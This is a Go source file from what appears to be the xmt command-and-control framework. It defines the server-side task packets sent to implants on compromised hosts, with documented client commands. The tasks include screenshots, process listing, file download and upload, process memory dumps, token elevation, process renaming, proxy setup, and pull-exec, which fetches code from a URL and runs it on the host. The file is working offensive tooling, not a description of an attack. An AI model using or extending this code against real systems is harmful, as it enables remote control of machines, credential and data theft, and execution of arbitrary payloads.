//go:build !implant

package task

import (
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

// Pwd returns a print current directory Packet. This can be used to instruct
// the client to return a string value that contains the current working
// directory.
//
// C2 Details:
//  ID: MvPwd
//
//  Input:
//      <none>
//  Output:
//      string // Working Dir
//
// C2 Client Command:
//  pwd
func Pwd() *com.Packet {
	return &com.Packet{ID: MvPwd}
}

// Mounts returns a list mounted drives Packet. This can be used to instruct
// the client to return a string list of all the mount points on the host device.
//
// C2 Details:
//  ID: MvMounts
//
//  Input:
//      <none>
//  Output:
//      []string // Mount Paths List
//
// C2 Client Command:
//  mounts
func Mounts() *com.Packet {
	return &com.Packet{ID: MvMounts}
}

// Refresh returns a refresh Packet. This will instruct the client to re-update
// it's internal Device storage and return the new result. This can be used to
// detect new network interfaces added/removed and changes to hostname/user
// status.
//
// This is NOT needed after a Migration, as this happens automatically.
//
// C2 Details:
//  ID: MvRefresh
//
//  Input:
//      <none>
//  Output:
//      Machine // Updated device details
//
// C2 Client Command:
//  refresh
func Refresh() *com.Packet {
	return &com.Packet{ID: MvRefresh}
}

// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
// based devices to drop any previous elevated Tokens they may posess and return
// to their "normal" Token.
//
// This task result does not return any data, only errors if it fails.
//
// C2 Details:
//  ID: MvRevSelf
//
//  Input:
//      <none>
//  Output:
//      <none>
//
// C2 Client Command:
//  rev2self
func RevToSelf() *com.Packet {
	return &com.Packet{ID: MvRevSelf}
}

// ScreenShot returns a screenshot Packet. This will instruct the client to
// attempt to get a screenshot of all the current active desktops on the host.
// If successful, the returned data is a binary blob of the resulting image,
// encoded in the PNG image format.
//
// C2 Details:
//  ID: TVScreenShot
//
//  Input:
//      <none>
//  Output:
//      []byte // Data
//
// C2 Client Command:
//  screenshot
func ScreenShot() *com.Packet {
	return &com.Packet{ID: TvScreenShot}
}

// Ls returns a file list Packet. This can be used to instruct the client
// to return a string and bool list of the files in the directory specified.
//
// If 'd' is empty, the current working directory "." is used.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvList
//
//  Input:
//      string          // Directory
//  Output:
//      uint32          // Count
//      []File struct { // List of Files
//          string      // Name
//          int32       // Mode
//          uint64      // Size
//          int64       // Modtime
//      }
//
// C2 Client Command:
//  ls [path]
//  dir [path]
func Ls(d string) *com.Packet {
	n := &com.Packet{ID: MvList}
	n.WriteString(d)
	return n
}

// ProcessList returns a list processes Packet. This can be used to instruct
// the client to return a list of the current running host's processes.
//
// C2 Details:
//  ID: TvProcList
//
//  Input:
//      <none>
//  Output:
//      uint32              // Count
//      []cmd.ProcessInfo { // List of Running Processes
//          uint32          // Process ID
//          uint32          // Parent Process ID
//          string          // Process Image Name
//      }
//
// C2 Client Command:
//  ps
func ProcessList() *com.Packet {
	return &com.Packet{ID: TvProcList}
}

// Cwd returns a change directory Packet. This can be used to instruct the
// client to change from it's current working directory to the directory
// specified.
//
// Empty or invalid directory entires will return an error.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvCwd
//
//  Input:
//      string // Directory
//  Output:
//      <none>
//
// C2 Client Command:
//  cd <path>
func Cwd(d string) *com.Packet {
	n := &com.Packet{ID: MvCwd}
	n.WriteString(d)
	return n
}

// Download returns a download Packet. This will instruct the client to
// read the (client local) filepath provided and return the raw binary data.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvDownload
//
//  Input:
//      string // Target
//  Output:
//      string // Expanded Target Path
//      bool   // Target is Directory
//      int64  // Size
//      []byte // Data
//
// C2 Client Command:
//  download <src> [dest]
func Download(src string) *com.Packet {
	n := &com.Packet{ID: TvDownload}
	n.WriteString(src)
	return n
}

// ProcessName returns a process name change Packet. This can be used to instruct
// the client to change from it's current in-memory name to the specified string.
//
// C2 Details:
//  ID: TvRename
//
//  Input:
//      string // New Process Name
//  Output:
//      <none>
//
// C2 Client Command:
//  proc-name <name>
func ProcessName(s string) *com.Packet {
	n := &com.Packet{ID: TvRename}
	n.WriteString(s)
	return n
}

// Pull returns a pull Packet. This will instruct the client to download the
// resource from the provided URL and write the data to the supplied local
// filesystem path.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvPull
//
//  Input:
//      string // URL
//      string // Target Path
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
//
// C2 Client Command:
//  pull <url> <dest>
func Pull(url, path string) *com.Packet {
	n := &com.Packet{ID: TvPull}
	n.WriteString(url)
	n.WriteString(path)
	return n
}

// ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
// client to attempt to remove the Proxy setup by the name, or the single Proxy
// instance (if multi-proxy mode is disabled).
//
// Returns an NotFound error if the Proxy is not registered or Proxy support is
// disabled
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      bool   // Always set to true for this task.
//  Output:
//      <none>
//
// C2 Client Command:
//  proxy_del <name>
func ProxyRemove(name string) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteBool(true)
	return n
}

// Elevate returns an evelate Packet. This will instruct the client to use the
// provided Filter to attempt to get a Token handle to an elevated process. If
// the Filter is nil, then the client will attempt at any elevated process.
//
// C2 Details:
//  ID: MvElevate
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      <none>
//
// C2 Client Command:
//  elevate [target]
func Elevate(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: MvElevate}
	f.MarshalStream(n)
	return n
}

// Upload returns a upload Packet. This will instruct the client to write the
// provided byte array to the filepath provided. The client will return the
// number of bytes written and the resulting expanded file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string // Destination
//      []byte // File Data
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
//
// C2 Client Command:
//  upload <src> <dst>
func Upload(dst string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	n.Write(b)
	return n
}

// ProcessDump will instruct the client to attempt to read and download then
// memory of the filter target. The returned data is a binary blob of the memory
// if successful.
//
// C2 Details:
//  ID: TvProcDump
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      []byte // Data
//
// C2 Client Command:
//  dump <target>
func ProcessDump(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvProcDump}
	f.MarshalStream(n)
	return n
}

// Proxy returns an add Proxy Packet. This can be used to instruct the client to
// attempt to add the specified Proxy with the name, bind address and Profile
// bytes.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      bool   // Always set to false for this task.
//      string // Proxy Bind Address
//      []byte // Proxy Profile
//  Output:
//      <none>
//
// C2 Client Command:
//  proxy <name> <address> <profile>
func Proxy(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteBool(false)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}

// UploadFile returns a upload  Packet. This will instruct the client to write
// the provided (server local) file content to the filepath provided. The client
// will return the number of bytes written and the resulting expanded file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// The source path may contain environment variables that will be resolved on
// server execution.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string // Destination
//      []byte // File Data
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
//
// C2 Client Command:
//  upload <src> <dst>
func UploadFile(dst, src string) (*com.Packet, error) {
	f, err := os.OpenFile(device.Expand(src), os.O_RDONLY, 0)
	if err != nil {
		return nil, err
	}
	n, err := UploadReader(dst, f)
	f.Close()
	return n, err
}

// UploadReader returns a upload Packet. This will instruct the client to write
// the provided reader content to the filepath provided. The client will return
// the number of bytes written and the resulting file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string // Destination
//      []byte // File Data
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
//
// C2 Client Command:
//  upload <src> <dst>
func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	_, err := io.Copy(n, r)
	return n, err
}

// PullExecute returns a pull and execute Packet. This will instruct the client
// to download the resource from the provided URL and execute the downloaded data.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
//
// This function allows for specifying a Filter struct to specify the target
// parent process and the boolean flag can be set to true/false to specify
// if the task should wait for the process to exit.
//
// Returns the same output as the 'Run*' tasks.
//
// C2 Details:
//  ID: TvPullExecute
//
//  Input:
//      string          // URL
//      bool            // Wait
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      uint32          // PID
//      int32           // Exit Code
//
// C2 Client Command:
//  pull-exec <url> [wait]
func PullExecute(url string, w bool, f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvPullExecute}
	n.WriteString(url)
	n.WriteBool(w)
	f.MarshalStream(n)
	return n
}
